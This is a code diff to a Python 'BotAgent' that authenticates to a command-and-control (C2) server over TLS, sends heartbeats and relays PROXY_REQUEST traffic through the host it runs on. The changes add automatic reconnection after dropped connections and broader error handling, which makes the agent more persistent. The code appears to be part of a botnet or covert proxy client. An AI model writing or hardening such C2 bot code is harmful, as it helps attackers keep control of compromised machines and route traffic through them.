@@ -46,38 +46,37 @@ class BotAgent:
         logger.info("Starting bot agent %s, connecting to %s:%d", self.bot_id, self.c2_host, self.c2_port)
         logger.info("Press Ctrl+C to shutdown gracefully")
         
-        try:
-            while not self._shutdown_event.is_set():
-                try:
-                    reader, writer = await asyncio.open_connection(self.c2_host, self.c2_port, ssl=self.ssl_ctx)
-                    self.stream = FramedStream(reader, writer)
-                    await self.stream.send(Frame(type="AUTH", meta={"token": self.token, "bot_id": self.bot_id}))
-                    ok = await self.stream.recv(timeout=10)
-                    if not ok or ok.type != "OK":
-                        logger.error("auth failed, retrying...")
-                        await asyncio.sleep(3)
-                        continue
-                    self.heartbeat = Heartbeat(self.stream, name=f"bot-{self.bot_id}")
-                    await self.heartbeat.start()
-                    logger.info("Connected to C2 %s:%d as %s", self.c2_host, self.c2_port, self.bot_id)
-                    self._running = True
-                    await self._run()
-                    break
-                except (ConnectionRefusedError, OSError, ssl.SSLError) as e:
-                    if not self._shutdown_event.is_set():
-                        logger.warning("connection failed: %s", e)
-                        await asyncio.sleep(2)
-                except asyncio.CancelledError:
-                    logger.info("connection cancelled")
-                    break
-                except Exception as e:
-                    if not self._shutdown_event.is_set():
-                        logger.error("unexpected connection error: %s", e)
-                        await asyncio.sleep(2)
-        except KeyboardInterrupt:
-            logger.info("Received keyboard interrupt")
-        finally:
-            await self._cleanup()
+        while not self._shutdown_event.is_set():
+            try:
+                reader, writer = await asyncio.open_connection(self.c2_host, self.c2_port, ssl=self.ssl_ctx)
+                self.stream = FramedStream(reader, writer)
+                await self.stream.send(Frame(type="AUTH", meta={"token": self.token, "bot_id": self.bot_id}))
+                ok = await self.stream.recv(timeout=10)
+                if not ok or ok.type != "OK":
+                    logger.error("auth failed, retrying...")
+                    await asyncio.sleep(3)
+                    continue
+                self.heartbeat = Heartbeat(self.stream, name=f"bot-{self.bot_id}")
+                await self.heartbeat.start()
+                logger.info("Connected to C2 %s:%d as %s", self.c2_host, self.c2_port, self.bot_id)
+                self._running = True
+                await self._run()
+                # If we get here, connection was lost, try to reconnect
+                logger.info("Connection lost, attempting to reconnect...")
+                await asyncio.sleep(2)
+            except (ConnectionRefusedError, OSError, ssl.SSLError) as e:
+                if not self._shutdown_event.is_set():
+                    logger.warning("connection failed: %s", e)
+                    await asyncio.sleep(2)
+            except asyncio.CancelledError:
+                logger.info("connection cancelled")
+                break
+            except Exception as e:
+                if not self._shutdown_event.is_set():
+                    logger.error("unexpected connection error: %s", e)
+                    await asyncio.sleep(2)
+        
+        await self._cleanup()
 
     async def _run(self):
         assert self.stream
@@ -86,7 +85,8 @@ class BotAgent:
                 try:
                     frame = await asyncio.wait_for(self.stream.recv(), timeout=1.0)
                     if frame is None:
-                        raise ConnectionError("tunnel closed")
+                        logger.warning("Tunnel closed, exiting run loop")
+                        break
                     if await self.heartbeat.handle_rx(frame):
                         continue
                     if frame.type == "PROXY_REQUEST":
@@ -98,7 +98,7 @@ class BotAgent:
                 except asyncio.TimeoutError:
                     # Check shutdown event periodically
                     continue
-                except ConnectionError as e:
+                except (ConnectionError, ConnectionResetError, ConnectionAbortedError, OSError) as e:
                     logger.warning("Connection error: %s", e)
                     break
                 except Exception as e:
@@ -194,9 +194,18 @@ class BotAgent:
                 chunk = await reader.read(4096)
                 if not chunk:
                     break
-                await self.stream.send(Frame(type="PROXY_RESPONSE", request_id=req_id, payload=chunk))
+                try:
+                    await self.stream.send(Frame(type="PROXY_RESPONSE", request_id=req_id, payload=chunk))
+                except (ConnectionResetError, ConnectionAbortedError, OSError, BrokenPipeError):
+                    # Connection lost, stop pumping
+                    break
+        except Exception as e:
+            logger.warning("Upstream pump error for %s: %s", req_id, e)
         finally:
-            await self.stream.send(Frame(type="END", request_id=req_id))
+            try:
+                await self.stream.send(Frame(type="END", request_id=req_id))
+            except Exception:
+                pass
 
 
 async def main():
